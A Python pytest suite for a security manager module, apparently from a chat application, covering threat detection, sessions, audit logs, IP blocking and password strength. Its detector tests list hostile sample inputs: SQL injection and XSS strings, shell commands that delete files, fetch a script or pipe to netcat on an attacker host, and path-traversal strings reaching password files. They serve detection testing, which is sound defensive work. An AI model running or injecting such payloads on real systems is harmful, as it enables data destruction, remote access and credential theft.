"""
Comprehensive test suite for Enhanced Security Manager
Tests all security components and features.
"""

import pytest
import asyncio
import time
from unittest.mock import Mock, patch
from datetime import datetime, timedelta

from src.plexichat.core.security.enhanced_security_manager import (
    EnhancedSecurityManager,
    ThreatDetector,
    SessionManager,
    AuditLogger,
    IntrusionDetector,
    VulnerabilityScanner
)

class TestThreatDetector:
    """Test the threat detection system."""
    
    def setup_method(self):
        self.detector = ThreatDetector()
    
    def test_sql_injection_detection(self):
        """Test SQL injection detection."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "admin'--",
            "' OR 1=1 --"
        ]
        
        for input_data in malicious_inputs:
            threats = self.detector.detect_threats(input_data)
            assert 'sql_injection' in threats, f"Failed to detect SQL injection in: {input_data}"
            assert self.detector.is_malicious(input_data), f"Should be marked as malicious: {input_data}"
    
    def test_xss_detection(self):
        """Test XSS detection."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "eval('alert(1)')"
        ]
        
        for input_data in malicious_inputs:
            threats = self.detector.detect_threats(input_data)
            assert 'xss' in threats, f"Failed to detect XSS in: {input_data}"
            assert self.detector.is_malicious(input_data), f"Should be marked as malicious: {input_data}"
    
    def test_command_injection_detection(self):
        """Test command injection detection."""
        malicious_inputs = [
            "; rm -rf /",
            "&& wget malicious.com/script.sh",
            "| nc attacker.com 4444",
            "`cat /etc/passwd`",
            "$(whoami)"
        ]
        
        for input_data in malicious_inputs:
            threats = self.detector.detect_threats(input_data)
            assert 'command_injection' in threats, f"Failed to detect command injection in: {input_data}"
            assert self.detector.is_malicious(input_data), f"Should be marked as malicious: {input_data}"
    
    def test_path_traversal_detection(self):
        """Test path traversal detection."""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "file:///etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd"
        ]
        
        for input_data in malicious_inputs:
            threats = self.detector.detect_threats(input_data)
            assert 'path_traversal' in threats, f"Failed to detect path traversal in: {input_data}"
            assert self.detector.is_malicious(input_data), f"Should be marked as malicious: {input_data}"
    
    def test_clean_input(self):
        """Test that clean input is not flagged as malicious."""
        clean_inputs = [
            "Hello, world!",
            "This is a normal message",
            "user@example.com",
            "123-456-7890",
            "https://example.com/page"
        ]
        
        for input_data in clean_inputs:
            assert not self.detector.is_malicious(input_data), f"Clean input flagged as malicious: {input_data}"

class TestSessionManager:
    """Test the session management system."""
    
    def setup_method(self):
        self.session_manager = SessionManager()
    
    def test_create_session(self):
        """Test session creation."""
        session_id = self.session_manager.create_session(
            user_id="user123",
            ip_address="192.168.1.1",
            user_agent="Mozilla/5.0"
        )
        
        assert session_id is not None
        assert len(session_id) > 0
        assert session_id in self.session_manager.active_sessions
        
        session_data = self.session_manager.active_sessions[session_id]
        assert session_data['user_id'] == "user123"
        assert session_data['ip_address'] == "192.168.1.1"
        assert session_data['is_active'] is True
    
    def test_validate_session(self):
        """Test session validation."""
        session_id = self.session_manager.create_session(
            user_id="user123",
            ip_address="192.168.1.1",
            user_agent="Mozilla/5.0"
        )
        
        # Valid session
        assert self.session_manager.validate_session(
            session_id, "192.168.1.1", "Mozilla/5.0"
        ) is True
        
        # Invalid session ID
        assert self.session_manager.validate_session(
            "invalid_session", "192.168.1.1", "Mozilla/5.0"
        ) is False
    
    def test_session_timeout(self):
        """Test session timeout."""
        session_id = self.session_manager.create_session(
            user_id="user123",
            ip_address="192.168.1.1",
            user_agent="Mozilla/5.0"
        )
        
        # Manually set old timestamp
        self.session_manager.active_sessions[session_id]['last_activity'] = time.time() - 3600  # 1 hour ago
        
        # Should be invalid due to timeout
        assert self.session_manager.validate_session(
            session_id, "192.168.1.1", "Mozilla/5.0"
        ) is False
        
        # Session should be removed
        assert session_id not in self.session_manager.active_sessions
    
    def test_ip_change_detection(self):
        """Test IP address change detection."""
        session_id = self.session_manager.create_session(
            user_id="user123",
            ip_address="192.168.1.1",
            user_agent="Mozilla/5.0"
        )
        
        # Validate with different IP
        result = self.session_manager.validate_session(
            session_id, "192.168.1.2", "Mozilla/5.0"
        )
        
        # Should still be valid but flag IP change
        assert result is True
        session_data = self.session_manager.active_sessions[session_id]
        assert session_data['security_flags']['ip_changed'] is True

class TestAuditLogger:
    """Test the audit logging system."""
    
    def setup_method(self):
        self.audit_logger = AuditLogger()
    
    def test_log_security_event(self):
        """Test logging security events."""
        self.audit_logger.log_security_event(
            event_type="LOGIN_ATTEMPT",
            user_id="user123",
            ip_address="192.168.1.1",
            details={"success": True},
            severity="INFO"
        )
        
        assert len(self.audit_logger.audit_events) == 1
        event = self.audit_logger.audit_events[0]
        
        assert event['event_type'] == "LOGIN_ATTEMPT"
        assert event['user_id'] == "user123"
        assert event['ip_address'] == "192.168.1.1"
        assert event['severity'] == "INFO"
        assert event['details']['success'] is True
    
    def test_get_events_by_user(self):
        """Test retrieving events by user."""
        # Log events for different users
        self.audit_logger.log_security_event("EVENT1", "user1", "192.168.1.1", {})
        self.audit_logger.log_security_event("EVENT2", "user2", "192.168.1.2", {})
        self.audit_logger.log_security_event("EVENT3", "user1", "192.168.1.1", {})
        
        user1_events = self.audit_logger.get_events_by_user("user1")
        assert len(user1_events) == 2
        
        user2_events = self.audit_logger.get_events_by_user("user2")
        assert len(user2_events) == 1
    
    def test_get_events_by_type(self):
        """Test retrieving events by type."""
        self.audit_logger.log_security_event("LOGIN", "user1", "192.168.1.1", {})
        self.audit_logger.log_security_event("LOGOUT", "user1", "192.168.1.1", {})
        self.audit_logger.log_security_event("LOGIN", "user2", "192.168.1.2", {})
        
        login_events = self.audit_logger.get_events_by_type("LOGIN")
        assert len(login_events) == 2
        
        logout_events = self.audit_logger.get_events_by_type("LOGOUT")
        assert len(logout_events) == 1

class TestIntrusionDetector:
    """Test the intrusion detection system."""
    
    def setup_method(self):
        self.intrusion_detector = IntrusionDetector()
    
    def test_failed_attempt_tracking(self):
        """Test tracking of failed attempts."""
        ip = "192.168.1.100"
        
        # Record multiple failed attempts
        for i in range(3):
            self.intrusion_detector.record_failed_attempt(ip)
        
        assert ip in self.intrusion_detector.failed_attempts
        assert len(self.intrusion_detector.failed_attempts[ip]) == 3
        assert not self.intrusion_detector.is_ip_blocked(ip)  # Not blocked yet
    
    def test_ip_blocking(self):
        """Test IP blocking after too many failed attempts."""
        ip = "192.168.1.101"
        
        # Record enough failed attempts to trigger blocking
        for i in range(6):  # More than max_failed_attempts (5)
            self.intrusion_detector.record_failed_attempt(ip)
        
        assert self.intrusion_detector.is_ip_blocked(ip)
        assert ip in self.intrusion_detector.blocked_ips
    
    def test_suspicious_pattern_detection(self):
        """Test suspicious pattern detection."""
        ip = "192.168.1.102"
        pattern = "sql_injection_attempt"
        
        # Record multiple suspicious patterns
        for i in range(12):  # More than threshold (10)
            self.intrusion_detector.detect_suspicious_pattern(ip, pattern)
        
        assert self.intrusion_detector.is_ip_blocked(ip)
        assert ip in self.intrusion_detector.blocked_ips
    
    def test_unblock_ip(self):
        """Test manual IP unblocking."""
        ip = "192.168.1.103"
        
        # Block IP first
        for i in range(6):
            self.intrusion_detector.record_failed_attempt(ip)
        
        assert self.intrusion_detector.is_ip_blocked(ip)
        
        # Unblock IP
        self.intrusion_detector.unblock_ip(ip)
        
        assert not self.intrusion_detector.is_ip_blocked(ip)
        assert ip not in self.intrusion_detector.blocked_ips

class TestVulnerabilityScanner:
    """Test the vulnerability scanner."""
    
    def setup_method(self):
        self.scanner = VulnerabilityScanner()
    
    def test_system_scan(self):
        """Test system vulnerability scan."""
        results = self.scanner.scan_system()
        
        assert 'scan_timestamp' in results
        assert 'vulnerabilities_found' in results
        assert 'security_score' in results
        assert 'recommendations' in results
        
        assert isinstance(results['security_score'], int)
        assert 0 <= results['security_score'] <= 100
        assert isinstance(results['recommendations'], list)
    
    def test_password_strength_weak(self):
        """Test weak password detection."""
        weak_passwords = ["123", "password", "abc", "12345678"]
        
        for password in weak_passwords:
            result = self.scanner.check_password_strength(password)
            assert result['strength'] in ['WEAK', 'MEDIUM']
            assert result['score'] < 80
            assert len(result['feedback']) > 0
    
    def test_password_strength_strong(self):
        """Test strong password detection."""
        strong_passwords = [
            "MyStr0ng!P@ssw0rd123",
            "C0mpl3x&S3cur3!P@ss",
            "Ungu3ss@bl3!P@ssw0rd2024"
        ]
        
        for password in strong_passwords:
            result = self.scanner.check_password_strength(password)
            assert result['strength'] == 'STRONG'
            assert result['score'] >= 80

class TestEnhancedSecurityManager:
    """Test the main Enhanced Security Manager."""
    
    def setup_method(self):
        self.security_manager = EnhancedSecurityManager()
    
    def test_initialization(self):
        """Test proper initialization of security manager."""
        assert self.security_manager.threat_detector is not None
        assert self.security_manager.session_manager is not None
        assert self.security_manager.audit_logger is not None
        assert self.security_manager.intrusion_detector is not None
        assert self.security_manager.vulnerability_scanner is not None
        
        assert len(self.security_manager.security_policies) > 0
        assert 'authentication' in self.security_manager.security_policies
        assert 'authorization' in self.security_manager.security_policies
    
    @pytest.mark.asyncio
    async def test_authenticate_user(self):
        """Test user authentication."""
        # This would require mocking the actual authentication system
        # For now, we'll test that the method exists and handles basic cases
        
        with patch.object(self.security_manager.rate_limiter, 'check_rate_limit') as mock_rate_limit:
            mock_rate_limit.return_value = {'allowed': True}
            
            # Test with invalid credentials (should be handled gracefully)
            result = await self.security_manager.authenticate_user(
                username="testuser",
                password="wrongpassword",
                source_ip="192.168.1.1"
            )
            
            # Should return a result dictionary
            assert isinstance(result, dict)
    
    def test_get_security_metrics(self):
        """Test security metrics retrieval."""
        metrics = self.security_manager.get_security_metrics()
        
        assert isinstance(metrics, dict)
        assert 'total_events' in metrics
        assert 'active_sessions' in metrics
        assert 'blocked_ips' in metrics
        assert 'security_level' in metrics
        assert 'last_updated' in metrics
    
    @pytest.mark.asyncio
    async def test_perform_security_scan(self):
        """Test security scan functionality."""
        results = await self.security_manager.perform_security_scan()
        
        assert isinstance(results, dict)
        assert 'security_score' in results
        assert 'active_threats' in results
        assert 'system_health' in results
    
    def test_block_unblock_ip(self):
        """Test IP blocking and unblocking."""
        test_ip = "192.168.1.200"
        
        # Block IP
        self.security_manager.block_ip_address(test_ip, "Test block")
        assert test_ip in self.security_manager.blocked_ips
        
        # Unblock IP
        self.security_manager.unblock_ip_address(test_ip)
        assert test_ip not in self.security_manager.blocked_ips
    
    def test_security_report_generation(self):
        """Test security report generation."""
        report = self.security_manager.get_security_report()
        
        assert isinstance(report, dict)
        assert 'report_timestamp' in report
        assert 'summary' in report
        assert 'event_breakdown' in report
        assert 'recommendations' in report
        
        # Check summary structure
        summary = report['summary']
        assert 'total_events_24h' in summary
        assert 'active_sessions' in summary
        assert 'threat_level' in summary

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
